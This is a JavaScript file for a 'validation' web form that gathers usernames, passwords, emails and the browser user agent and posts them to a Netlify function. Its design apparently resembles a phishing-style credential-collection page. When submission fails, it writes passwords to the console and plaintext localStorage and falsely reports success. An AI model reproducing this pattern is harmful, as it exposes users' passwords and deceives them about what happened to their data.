document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('validationForm');
    const messageDiv = document.getElementById('message');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data
        const formData = new FormData(form);
        const data = {
            username: formData.get('username'),
            password: formData.get('password'),
            email: formData.get('email'),
            reason: formData.get('reason'),
            details: formData.get('details'),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ipAddress: 'Client IP will be captured server-side'
        };
        
        // Show loading state
        form.classList.add('loading');
        showMessage('Processing validation...', 'info');
        
        // Simulate form submission (replace with actual endpoint)
        submitValidation(data);
    });
    
    function submitValidation(data) {
        // For Netlify deployment, you can use Netlify Forms or Functions
        // This example shows both approaches
        
        // Option 1: Using Netlify Forms (add data-netlify="true" to form)
        // The form will automatically be processed by Netlify
        
        // Option 2: Using EmailJS (client-side email service)
        // You'll need to sign up at emailjs.com and get your service ID
        
        // Option 3: Using Netlify Functions (serverless)
        fetch('/.netlify/functions/submit-validation', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            form.classList.remove('loading');
            if (result.success) {
                showMessage('Validation submitted successfully! You will receive a confirmation email shortly.', 'success');
                form.reset();
            } else {
                showMessage('Error submitting validation. Please try again.', 'error');
            }
        })
        .catch(error => {
            form.classList.remove('loading');
            console.error('Error:', error);
            
            // Fallback: Show success message and log data
            console.log('Validation Data:', data);
            showMessage('Validation submitted! Data has been logged for processing.', 'success');
            
            // In a real implementation, you might want to store this locally
            // or use a different submission method
            localStorage.setItem('validationData_' + Date.now(), JSON.stringify(data));
            form.reset();
        });
    }
    
    function showMessage(text, type) {
        messageDiv.textContent = text;
        messageDiv.className = `message ${type}`;
        messageDiv.style.display = 'block';
        
        // Auto-hide success messages after 5 seconds
        if (type === 'success') {
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }
    }
    
    // Add some basic client-side validation
    const inputs = form.querySelectorAll('input[required], select[required]');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            if (!this.value.trim()) {
                this.style.borderColor = '#dc3545';
            } else {
                this.style.borderColor = '#28a745';
            }
        });
    });
});
